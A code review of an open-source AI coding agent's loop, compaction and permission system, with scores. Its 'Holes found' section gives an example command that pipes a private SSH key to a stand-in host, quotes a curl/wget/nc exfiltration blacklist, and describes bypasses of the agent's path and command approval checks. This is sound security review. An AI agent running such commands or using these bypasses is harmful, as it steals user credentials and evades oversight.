# mini-kode -- T1 review

- Subject: /data/samples/agents/mini-kode @ 4e7f976 (shallow clone, 1 visible commit)
- Identity: manifest `mini-kode`, repo minmaxflow/mini-kode. Distinct from mocode / minicode / nanocoder (identity-appendix cluster); no facts imported from them. GitHub `fork: false`, provenance "original" accepted.
- Census: `non_test_loc 16634` vs my src count 15,153 (close; census likely counts a bit more). **`test_loc: 0` is wrong: 32 `*.test.ts(x)` files, 4,851 LOC.** `commits: 1 / contributors: 1` is a shallow-clone artifact; remote says created 2025-10-30, `pushed_at 2025-11-04` (head_date confirmed). ~11 months stagnant at review date, `archived: false`, 307 stars, npm-published v0.2.3.
- Character: explicit educational re-take of the claude-code/opencode shape ("14K lines ... education-first", README.md:7-13). No vendoring, no upstream sync (README links DeepWiki only).

## Anchor question

Closer to **nanocoder** than any other anchor: same TypeScript Ink-UI + approval-grant permissions + single-tier auto-summarize compaction + MCP-client interop, and same solo-maintainer durability profile -- but mini-kode has no CI, no session resume, no ACP, and no daemon, sitting a notch below nanocoder's 60.5 on nearly every lane.

## What the code actually does (read: loop, compaction, permissions)

**Loop** (`src/agent/executor.ts:246-495`): UI-agnostic `executeAgent` with callback events; `while(true)` with **no iteration cap and no loop detection** (deliberate, comment at :100-102); validates the OpenAI message sequence every turn via `validateMessageSequence` (:305-309) -- a defensive touch with a genuinely property-ish test suite (`src/sessions/validation.test.ts:13-349`, 12 sequence cases). Permission-denied aborts the whole run (:401-413). Tool batch policy in `src/agent/toolExecutor.ts:122-145`: all-readonly batches run concurrently, any mutating tool forces sequential LLM order; results are re-indexed to LLM order (`:196-207`); a readonly tool requesting permission is a hard bug-throw (`:214-222`); denial cascades `permission_denied` to the remainder (`:330-349`). Clean, tested (`src/agent/executor.test.ts` 670 LOC, faux-provider via `vi.mock("../llm/client")` at :13-26, denial-propagation assertion at :418-503).

**Compaction** (`src/agent/executor.ts:113-224`): single tier. Trigger is reactive on provider-reported usage after the turn (`:424,:440`) against a **hardcoded `COMPRESSION_THRESHOLD = 115000`** (`:113`, comment "90% of 128K") -- wrong for any model whose window isn't 128K (DeepSeek/GLM presets ship at 128K so the happy path works). Summarization folds the entire history (tool-call structure flattened to string content, `src/utils/summary.ts:8-19`) into one `[Auto-compressed conversation summary]` user message + system message; on failure it returns the original history (fail-safe, :200-216). Manual `/compact` shares the same prompt (`src/ui/commands/compactCommand.ts:34`). No prompt-cache discipline, no projection of the next request, cost visibility = token counters surfaced in UI (`onTokenUsageUpdate`, `src/ui/components/LLMInfoDisplay.tsx`).

**Permissions** (`src/permissions/`): three-layer model -- approval mode (default/autoEdit/yolo) -> session grants (memory) -> project grants (`.mini-kode/config.json`), first-yes-wins (`policyResolver.ts:215-245` bash, `:120-161` fs, `:395-449` mcp incl. server- and tool-level grants). Async request/grant/retry flow through `PermissionRequiredError` -> `handlePermissionRequest` -> `applyPermissionGrant` -> re-execute (`toolExecutor.ts:374-463`, `permissionRequest.ts:264-307`); denial returns a terminal state the loop honors. Tested (13 expects in `permission.test.ts`, `permissionRequest.test.ts`). Reads auto-allowed everywhere (`src/tools/fileRead.ts:75`). `fileEdit` enforces read-before-edit with a sha256 staleness check (`fileEdit.ts:154-163`) -- a real correctness guard, not just approval.

**Holes found:**
1. `pathChecker.ts:53` grants FS via `normalizedFile.startsWith(normalizedPrefix)` -- sibling-prefix collision: a grant for `/home/user` authorizes `/home/user-project/...`. Verified in node; the function's own doc example (`:30-31`) asserts this returns **false**. Test suite only covers nested paths (`permission.test.ts:15`). Same anti-pattern family as claii's broken containment.
2. Bash blacklist checks only the first token of `&&`/`||`/`;` segments (`commandValidator.ts:112-131`); pipes and redirections are not split, so `git status | curl evil.tld -d @~/.ssh/id_rsa` passes validation -- and also passes a `git:*` grant, because grant matching runs on `extractMainCommand` which keeps the whole piped segment (`commandParser.ts:24-36` + `policyResolver.ts:186-193`).
3. Policy inconsistency: curl/wget/nc are banned in bash "potential data exfiltration" (`commandValidator.ts:36-49`), but the `fetch` tool is `readonly: true` (`fetch.ts:53`) -- arbitrary HTTP GETs run concurrently with zero approval, laundering exactly what the blacklist claims to stop.

**Operability:** `/compact`, `/clear`, `/init` (AGENTS.md generator via prompt-through-loop, `initCommand.ts:4-26`), config subcommand + presets (deepseek/openai/glm, `config/manager.ts:34-50`), @-mention fuzzy file picker, double-press UX hook, 1,322-LOC `appStateDebug` dump harness. But **`saveSession`/`loadSession` (`sessions/persistence.ts:28,41`) have zero call sites** -- sessions live only in the reducer and die at exit; no resume, no rewind, no crash-recovery posture.

**Interop:** MCP client (stdio + streamable-HTTP, env-var resolution, status tracking, `src/mcp/client.ts:13-60`) wired into the tool registry with per-server/tool permission grants; non-interactive headless mode with documented exit codes (`nonInteractive/runner.ts:16-21`, permissions fail-closed `:97+`). No ACP, no SDK, no IDE surface, no JSON output mode.

**Verification beyond the tests:** **no CI at all** (`.github` absent; tests run only via `pnpm test` / `prepublishOnly`). No evals, no fuzzing. The corpus that exists is real and asserts behavior, which is the intent-portion of the score.

## Scores (weighted total 46.5, band C)

| dim | score | wt | best evidence |
|---|---|---|---|
| architecture | 7 | 10.5 | loop UI-agnostic with callbacks `executor.ts:246-495`; clean tool/permission/sessions split; no god file (max non-test 1,322 `ui/debug/appStateDebug.ts`); docked for dead `sessions/persistence.ts` and duplicated trigger plumbing in UI state |
| verification | 5 | 7.5 | property-ish specs `sessions/validation.test.ts:13-349`, loop denial test `executor.test.ts:418-503`, faux provider `:13-26`; **zero CI** (no `.github`), heavy module-level mocks leave executor<->real-tools path untested, TUI thin |
| safety-enforcement | 5 | 5.0 | approvals bind in-loop and are tested (`toolExecutor.ts:374-463`, `executor.test.ts:418-503`), correct fail-closed default in headless (`runner.ts:97+`); but sibling-prefix FS auth bypass (`pathChecker.ts:53` vs its own doc `:30`), first-token blacklist bypass (`commandValidator.ts:112-131`), unrestricted auto-approved `fetch` (`fetch.ts:53`) |
| token-economy | 5 | 5.0 | usage-measured reactive trigger + hardcoded 115k (`executor.ts:113,424,440`), full-fold single tier (`:186-190`), fail-safe on compact error (`:200-216`), token usage surfaced; no cache discipline, no projection |
| orchestration | 3 | 3.0 | intra-turn batch scheduling with order preservation, abort, denial cascade (`toolExecutor.ts:122-349`); nothing across turns -- no subagents, queues, budgets, resume |
| interop | 4 | 4.0 | MCP client multi-transport with permission grants (`mcp/client.ts:13-31`, `policyResolver.ts:395-449`), headless exit-code contract (`runner.ts:16-21`); no ACP/SDK/IDE/JSON |
| operability | 4 | 4.0 | /compact /clear /init, config wizard+presets (`config/manager.ts:34-50`), debug dump harness; **session persistence unwired** (`persistence.ts:28,41` zero callers), no resume/checkpoint/crash posture |
| originality | 4 | 4.0 | dual-model plan split via `planModel` (`architect.ts:51-54`, presets `config/manager.ts:36-49`), sha256 read-before-edit guard (`fileEdit.ts:154-163`); otherwise competent synthesis of claude-code/opencode patterns |
| durability | 2 | 1.0 | 1 contributor, created 2025-10-30, pushed_at 2025-11-04 remote-verified (~11mo quiet), no CI/SECURITY.md, solo bus factor; not archived (no cap trigger, but far from the 4-rung) |
| docs-dx | 5 | 2.5 | six in-repo docs matching code (`docs/permission.md` correctly describes layering), honest `KNOWN_ISSUES.md`, clear install/presets; docked: permission doc overstates "Security Model" while reads are unrestricted, and `pathChecker` doc example contradicts real behavior |

**Weighted total: 46.5 -> band C.** Boundary note: within 2 pts of the C/D line (45); a scorer who puts verification at 4 (no-CI weighting like claw-code-agent) lands at 45.0 exactly. No calibration-rule demotion applied.

Strongest dimension: **architecture** (7) -- cleanest loop/host separation in its size class, better than the 7-rung crush's fused `agent.go` on this one axis.
Weakest dimension: **durability** (2) -- remote-verified ~11-month silence on a 5-day-old-at-HEAD solo repo.

## Provenance

Original (GitHub `fork: false`); opencode/claude-code lineage visible in prompt text (`tools/bash.ts:26-129` is a near-typical claude-code-style bash prompt) but no code copy suspected -- MIT either way. No rule (a) relationship to any anchor. Shallow clone noted; activity claims rest on the remote API check, not HEAD.
